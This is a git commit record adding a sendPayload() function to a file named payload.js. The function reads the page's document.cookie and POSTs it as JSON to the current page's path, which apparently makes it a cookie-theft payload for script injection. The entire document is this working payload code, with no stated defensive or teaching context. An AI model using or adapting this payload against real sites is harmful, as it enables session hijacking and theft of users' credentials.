08366ca880ab1df5e2c92e1196b107587d4b6bbc
Jian Wei Tan <jianwei.tan@unity3d.com>
2021-04-27 22:26:33 +0800

    Add function to payload

--- payload.js
+++ payload.js
@@ -8,3 +8,17 @@ xhr.send(JSON.stringify(
   "message":message
 }
 ));
+
+function sendPayload()
+{
+	var message = document.cookie;
+	var xhr = null;
+	xhr = new XMLHttpRequest();
+	xhr.open("POST", window.location.pathname, true);
+	xhr.setRequestHeader("Content-Type", "application/json");
+	xhr.send(JSON.stringify(
+	{
+	  "message":message
+	}
+	));
+}
